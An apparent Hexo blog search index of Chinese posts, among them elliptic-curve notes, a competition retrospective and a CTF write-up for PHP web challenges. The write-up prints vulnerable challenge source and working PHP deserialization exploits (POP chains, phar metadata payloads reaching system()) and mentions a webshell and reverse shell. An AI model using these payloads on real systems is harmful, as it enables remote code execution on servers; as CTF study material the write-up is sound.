<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Good Bye ACM</title>
    <url>/2021/05/20/Good-Bye-ACM/</url>
    <content><![CDATA[<h2 id="再见，Die-java"><a href="#再见，Die-java" class="headerlink" title="再见，Die_java"></a>再见，Die_java</h2><p>笔者是打OI出身的…高中时候用博客园建了个博客，链接是<a href="https://www.cnblogs.com/FYH-SSGSS">这个</a>。是专门记录做题的，后来高二退役之后就基本没碰，到了大一原计划是转方向打CTF的，但是十分神奇的听了学校宣讲就被拉去打ACM了，同时也组了队，队名是铲车人，英文名是Die_java于是那个博客园又变成了记录打ACM的记录，之后学校成立了wiki，把队内训练的记录全放在了<a href="https://wiki.buaaacm.com/doku.php?id=2020-2021:teams:Die_Java:front_page">这里</a>。在学校集训队摸爬滚打了大一下以及大一暑假，历经了十几次训练，最终，我们以校内第11队勉强出线了…在大二上的CCPC秦皇岛站拿了银，ICPC济南站拿了金（虽然是倒数第二）。回顾这一年来，各种酸甜苦辣尝尽后回看这两块牌子，真是回味无穷。尽管中间训练经常被暴打，很自闭，但还是坚持下来了，并拿了一个不错的成绩，感谢我的两位队友的carry，没有你们的陪同，我是不可能坚持到那一刻的。大二寒假，我们队内都不想打下一个赛季了，于是铲车人就光荣的退役啦！</p>
]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>ACM</tag>
      </tags>
  </entry>
  <entry>
    <title>babyECC</title>
    <url>/2021/05/26/babyECC/</url>
    <content><![CDATA[<h1 id="椭圆曲线初学"><a href="#椭圆曲线初学" class="headerlink" title="椭圆曲线初学"></a>椭圆曲线初学</h1><p>随手整理的，可能全是错。。</p>
<span id="more"></span>
<p>椭圆曲线方程:$y^2=x^3+ax+b$，其中$a,b\in R$</p>
<p>判别式：$\Delta = -16(4a^3+27b^2)\neq0$</p>
<p>当$\Delta&gt;0$时，曲线有两个联通分量，$\Delta&lt;0$时候有一个联通分量。</p>
<p><img src="/2021/05/26/babyECC/photo/ECC01.png" alt="ECC1"></p>
<h2 id="椭圆曲线的运算"><a href="#椭圆曲线的运算" class="headerlink" title="椭圆曲线的运算"></a>椭圆曲线的运算</h2><ul>
<li><p>定义了一个$E$上的交换群，这个群以无穷远点$O$为单位元。</p>
</li>
<li><p>定义 + 运算子：取E上的两点$P$,$Q$，若两者相异，$P + Q$表示穿过$P$和$Q$的弦和椭圆曲线相交的第三点，再经x轴反射的镜像点；若两者是同一点，$P+P=2P$表示以$P$为切点和椭圆曲线相交的点再经x轴反射的镜像点。若P和Q的弦与y轴平行，$P+Q=0$（无限远点）。</p>
</li>
<li><p>性质1：$O+P=P+O$</p>
</li>
<li><p>性质2：$-P=(x,-y)$</p>
</li>
<li><p>具体运算：要是我上高中沉迷于圆锥曲线肯定是会动手算的，可惜现在早已没了当时的劲头：</p>
<script type="math/tex; mode=display">
P_3=(x_3,y_3)=P_1+P_2\neq O</script><script type="math/tex; mode=display">
x_3=k^2-x_1-x_2</script><script type="math/tex; mode=display">
y_3=k(x_1-x_3)-y_1</script><script type="math/tex; mode=display">
其中k=\dfrac{y_2-y_1}{x_2-x_1},(x_1\neq x_2)或\dfrac{3x_1^2+a}{2y_1}.(x1=x_2)</script></li>
</ul>
<h2 id="素域上的椭圆曲线"><a href="#素域上的椭圆曲线" class="headerlink" title="素域上的椭圆曲线"></a>素域上的椭圆曲线</h2><p>模$P$,除法全变成逆元。</p>
<h2 id="GF-2-n-上的椭圆曲线"><a href="#GF-2-n-上的椭圆曲线" class="headerlink" title="$GF(2^n)$上的椭圆曲线"></a>$GF(2^n)$上的椭圆曲线</h2><h2 id="椭圆曲线上的加解密"><a href="#椭圆曲线上的加解密" class="headerlink" title="椭圆曲线上的加解密"></a>椭圆曲线上的加解密</h2><p>用户A的私钥$n_A$,公钥为$P_A=n_A\times G$</p>
<p>用户A的私钥$n_B$,公钥为$P_A=n_B\times G$</p>
<p>A将消息$P_m$加密过程：</p>
<ul>
<li>选取随机数$k$,密文$C_m=\{kG,P_m+kP_B\}$，简记为$\{C_1,C_2\}$</li>
</ul>
<p>解密过程：$C_2-n_BC_1=P_m+kP_B-kn_BG=P_m$，解密完成。</p>
<h2 id="椭圆曲线上的密钥交换"><a href="#椭圆曲线上的密钥交换" class="headerlink" title="椭圆曲线上的密钥交换"></a>椭圆曲线上的密钥交换</h2><p>用户A的私钥$n_A$,公钥为$P_A=n_A\times G$</p>
<p>用户A的私钥$n_B$,公钥为$P_A=n_B\times G$</p>
<p>A产生的密钥$K=n_A\times P_B$,B产生的密钥为$K=n_B\times P_A$</p>
<p>可以发现$n_A\times P_B = n_A\times n_B\times G = n_B \times P_A$</p>
<p>可以进行密钥交换。</p>
<h2 id="具体应用"><a href="#具体应用" class="headerlink" title="具体应用"></a>具体应用</h2><ul>
<li><p>求一条椭圆曲线的阶，这个可以用schoof算法在多项式时间内解决。</p>
<blockquote>
<p><a href="https://en.wikipedia.org/wiki/Schoof&#39;s_algorithm">schoof链接</a></p>
</blockquote>
</li>
<li><p>已知一个点，求这个点的阶，这个用hasse算法也可以解决。</p>
<blockquote>
<p><a href="https://en.wikipedia.org/wiki/Hasse%27s_theorem_on_elliptic_curves">链接</a></p>
</blockquote>
</li>
<li><p>生成标准里要求$n$为素数，那么实际问题都是我们已知$n$,去求$G$。</p>
<p><img src="/2021/05/26/babyECC/photo/ECC02.png" alt="ECC2"></p>
</li>
</ul>
<p>原以为这些都要自己手动实现，后来经助教确认不用了，那就简单记录一下sage里面椭圆曲线的用法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">E = EllipticCurve(GF(p), [a, b]) <span class="comment">#表示生成一个参数为a,b,p的椭圆曲线</span></span><br><span class="line">E.order() <span class="comment">#群的阶</span></span><br><span class="line">E.gen() <span class="comment">#生成元</span></span><br><span class="line">P = E.random_point() <span class="comment">#随机一点</span></span><br><span class="line">P = E(xxxxx,yyyy) <span class="comment">#点的坐标</span></span><br><span class="line">P.order() <span class="comment">#元素的阶</span></span><br><span class="line">P.discrete_log(Q) <span class="comment">#P,Q是曲线上两点，尝试去求离散对数</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>school</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/05/18/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>hellohexo</title>
    <url>/2021/05/18/hellohexo/</url>
    <content><![CDATA[<h2 id="hellohexo"><a href="#hellohexo" class="headerlink" title="hellohexo"></a>hellohexo</h2><p>之前一直想建一个像模像样的博客，因为各种事情一直搁置，终于，在国赛比完后的第二天一时兴起，决定要搭一个github博客，采用了hexo这个静态博客网站生成器，用的是next主题，可能还不是很好看，后期会逐渐完善的~</p>
<p>本博客暂时先记录我在本科阶段打ctf的一些学习笔记和writeup，以及课内学的复习笔记（如果我用电脑复习的话），或者一些好玩的东西也尽量往上放。</p>
]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>bluecat</title>
    <url>/2021/06/06/bluecat/</url>
    <content><![CDATA[<h1 id="蓝帽杯复赛Web方向WP"><a href="#蓝帽杯复赛Web方向WP" class="headerlink" title="蓝帽杯复赛Web方向WP"></a>蓝帽杯复赛Web方向WP</h1><p>信息论考试推迟，导致又能去蓝帽杯线下了，可惜主办方跟我们说你们还是线上打吧，但是外地旅游的去意已决，最后硬着头皮和队友们还有学长去哈尔滨了，这波叫去线下打线上赛。</p>
<span id="more"></span>
<h2 id="jack-and-rose"><a href="#jack-and-rose" class="headerlink" title="jack and rose"></a>jack and rose</h2><p>反序列化链题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//highlight_file(__file__);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$action</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$b</span>-&gt;<span class="variable">$a</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Love</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$rose</span> = <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">        call_user_func(<span class="variable">$rose</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;jack love rose&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Titanic</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$people</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ship</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;people-&gt;action=<span class="keyword">$this</span>-&gt;ship;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rose</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">if</span>( (<span class="keyword">$this</span>-&gt;var1 != <span class="keyword">$this</span>-&gt;var2) &amp;&amp; (md5(<span class="keyword">$this</span>-&gt;var1) === md5(<span class="keyword">$this</span>-&gt;var2)) &amp;&amp; (sha1(<span class="keyword">$this</span>-&gt;var1)=== sha1(<span class="keyword">$this</span>-&gt;var2)) )&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;var1);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;love&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$sail</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;love&#x27;</span>];</span><br><span class="line">    unserialize(<span class="variable">$sail</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先看利用链的重点，需要绕过md5和sha1，目前我所知的绕过方法只有数组，但是数组绕过后，eval没法执行数组，所以没法用数组绕。</p>
<p>参考了这篇文章<a href="https://mayi077.gitee.io/2020/08/14/%E5%88%A9%E7%94%A8-Exception%E7%B1%BB-%E7%BB%95%E8%BF%87md5-sha1-%E7%AD%89%E7%B3%BB%E5%88%97/">https://mayi077.gitee.io/2020/08/14/%E5%88%A9%E7%94%A8-Exception%E7%B1%BB-%E7%BB%95%E8%BF%87md5-sha1-%E7%AD%89%E7%B3%BB%E5%88%97/</a></p>
<p>大概思路就是找到一个类的两个对象，使得他们的__tostring函数一样然而对象不一样，找到了Exception类，他的tostring就是异常的信息。这样是可以绕过的，那么问题就是如何利用eval，可以看到这个tostring后面还有很多乱七八糟的代码，</p>
<p><img src="/2021/06/06/bluecat/assets/image-20210606102237400.png" alt="image-20210606102237400"></p>
<p>所以我们需要?&gt;闭合php方可进行RCE。</p>
<p>然后开始从头开始找链子，所有魔术方法中只有Titanic的析构函数能作为入口，这里面调用了一个对象的action，然后进行了赋值，这块很明显就是用Jack类的<code>__set</code>方法激活，这个方法会再调用一个函数，现在只剩下Love类的<code>__call</code>方法，call这块会进行一个函数回调，传入一个Rose类的话就会调用<code>__invoke</code>，然后就完了。</p>
<p>因为exception类里有private和protected类型，所以最终一定要url编码！！（被这卡了半天真是蠢死了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cmd</span> =<span class="string">&#x27;system(&quot;cat /flag&quot;);?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$ex1</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>);<span class="variable">$ex2</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$timeline</span> = <span class="keyword">new</span> Rose();</span><br><span class="line"><span class="variable">$timeline</span>-&gt;var1 = <span class="variable">$ex1</span>;</span><br><span class="line"><span class="variable">$timeline</span>-&gt;var2 = <span class="variable">$ex2</span>;</span><br><span class="line"><span class="variable">$tt</span> = <span class="keyword">new</span> Titanic();</span><br><span class="line"><span class="variable">$J</span> = <span class="keyword">new</span> Jack();</span><br><span class="line"><span class="variable">$love</span> = <span class="keyword">new</span> Love();</span><br><span class="line"><span class="variable">$love</span>-&gt;var = <span class="variable">$timeline</span>;</span><br><span class="line"><span class="variable">$tt</span>-&gt;ship = <span class="variable">$love</span>;</span><br><span class="line"><span class="variable">$tt</span>-&gt;people = <span class="variable">$J</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$tt</span>)) ;</span><br></pre></td></tr></table></figure>
<p>顺便记录一下遍历php各个类的方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$classes</span> = get_declared_classes();  <span class="comment">//返回由已定义类的名字所组成的数组</span></span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$c</span>) &#123;  <span class="comment">//get_class_methods返回由类的方法名组成的数组</span></span><br><span class="line">		<span class="keyword">if</span> (in_array(<span class="string">&#x27;__toString&#x27;</span>, get_class_methods(<span class="variable">$c</span>)))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$c</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h2 id="不一样的web"><a href="#不一样的web" class="headerlink" title="不一样的web"></a>不一样的web</h2><p>注释里藏有Read类和Test类，界面有一个上传头像，虽说是要求gif，实则没有任何过滤，仅要求文件末尾是.gif，传个稍微大一点的头像就500了，传入成功后会告诉我们头像的地址，下面有一个输入地址的框可以显示头像是否成功上传。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;f = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="keyword">$this</span>-&gt;f;</span><br><span class="line">        <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="string">&quot;lib.php&quot;</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>唯一的反序列化点就是下面那个Url了，本地生成phar然后修改后缀为.gif直接上传，然后在下面用phar://触发反序列化。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;aa.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php__HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test(<span class="string">&#x27;Read::file_get&#x27;</span>);<span class="comment">//读lib.php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test(<span class="string">&#x27;phpinfo&#x27;</span>);<span class="comment">//获取phpinfo()</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>这题很sb的一点是每次只能上传一个文件，所以我还得反复开关靶机。。</p>
<p>新获取到的lib.php源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$old_id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$new_id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p_id</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;old_id = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;new_id = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p_id = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new_id</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;old_id = random_bytes(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;old_id === <span class="keyword">$this</span>-&gt;new_id) &#123;</span><br><span class="line">            system(<span class="keyword">$this</span>-&gt;p_id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Files</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="keyword">$this</span>-&gt;FilesWaf(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;FilesWaf(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your file is &quot;</span> . <span class="keyword">$this</span>-&gt;FilesWaf(<span class="keyword">$this</span>-&gt;filename) . <span class="string">&quot;.&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">FilesWaf</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="variable">$name</span>, <span class="string">&quot;/&quot;</span>) !== <span class="literal">False</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$profile</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">$this</span>-&gt;UserWaf(<span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile = <span class="string">&quot;I am admin.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;UserWaf(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;profile-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;baibai&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span> . <span class="keyword">$this</span>-&gt;UserWaf(<span class="keyword">$this</span>-&gt;name) . <span class="string">&quot;.&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">UserWaf</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen(<span class="variable">$name</span>) &gt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[a-f0-9]/iu&quot;</span>, <span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续找利用链，终点是Modifier类的<code>__get</code>函数。很离谱的是<code>$new_id = $value;</code>，没有<code>this-&gt;</code>。所以<code>this-&gt;new_id</code>为自己可控的，为了绕过随机数检测，我们用引用赋值绕过即可。<br>如何触发<code>__get</code>，就去访问Modifier类的不存在的参数，审计了一遍，File类不存在，唯一有的就是User类的<code>__tostring</code>的<code>return $this-&gt;profile-&gt;name;</code>。所以要把User类的profile赋为Modifier类，<code>__tostring</code>在UserWaf的时候触发，所以Username中的name应该也是一个User类。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> User(<span class="string">&#x27;fyhssgss&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$b</span>-&gt;name = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;p_id = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;profile = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;new_id = &amp;<span class="variable">$a</span>-&gt;old_id;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;aa.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php__HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>传入后成功get shell,cat /flag后啥也没有。所以得找flag。但是一次只能传一个指令，干脆直接写个马到另一个php，然后用蚁剑去连（以下的操作没有实操过</p>
<p>但是好像连上去之后蚁剑十分不稳定，所以反弹shell到自己服务器上，在game目录下找到一个/game，逆出来发现是登录密码，然后进去在/etc/passwd，存在home用户，家目录为/home/flag，flag在/home/flag/f14g_1s_h3r3</p>
<p>最后，祝贺or4nge队晋级决赛！</p>
<p><img src="/2021/06/06/bluecat/assets/image-20210606152331367.png" alt="image-20210606152331367"></p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Web-Training:Sqli-labs</title>
    <url>/2021/06/06/Web-Training-Sqli-labs/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>航概期末绝杀</title>
    <url>/2021/06/26/%E7%9B%B4%E5%8D%87%E6%9C%BA/</url>
